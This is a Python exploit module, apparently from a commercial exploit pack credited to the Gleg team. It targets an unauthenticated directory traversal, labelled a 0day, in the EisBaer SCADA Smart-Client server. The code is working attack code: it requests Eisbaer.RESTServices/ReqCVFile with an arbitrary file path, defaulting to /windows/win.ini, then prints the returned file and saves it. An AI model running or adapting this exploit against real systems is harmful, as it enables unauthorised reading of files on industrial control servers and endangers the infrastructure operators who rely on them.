#!/usr/bin/env python

import urllib2
from collections import OrderedDict

from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_eisbaer_scada_directory_traversal2"
INFO['DESCRIPTION'] = "EisBaer Scada Smart-Client's Server Directory Traversal"
INFO['VENDOR'] = "http://www.busbaer.de/"
INFO["CVE Name"] = "0day"
INFO["NOTES"] = """
    Vulnerability allows unauthenticated user to read contents of arbitrary file on remote machine.
Tested against version 2.1.1321.1942 on Windows 7 x64.
"""
INFO["DOWNLOAD_LINK"] = "http://www.busbaer.de/eiscomp,index,op,sub,op1,24.html"
INFO["LINKS"] = [""]
INFO['CHANGELOG'] = "27 Jun, 2017. Written by Gleg team."
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.176"
OPTIONS["PORT"] = 8000
OPTIONS["HTTPS"] = False
OPTIONS["FILENAME"] = "/windows/win.ini"


class exploit(Sploit):
    def __init__(self, host="",
                 port=0, ssl=False,
                 logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.https = self.args.get("HTTPS", OPTIONS["HTTPS"])
        self.filename = self.args.get("FILENAME", OPTIONS["FILENAME"])

    def make_url(self, path=''):
        protocol = "https" if self.https else "http"
        url = "%s://%s:%s/%s" % (protocol, self.host, self.port, path)
        return url

    def run(self):
        # Get options from gui
        self.args()
        self.log('[*] Trying to get contents of %s' % self.filename)
        url = self.make_url('Eisbaer.RESTServices/ReqCVFile?x=%s' % urllib2.quote(self.filename))
        resp = urllib2.urlopen(url)
        if resp.code != 200:
            self.log("File is not exists")
            self.finish(False)
        content = resp.read()
        if len(content) < 10000:
            self.log('[+]\r\n' + content)
        self.writefile(content)
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()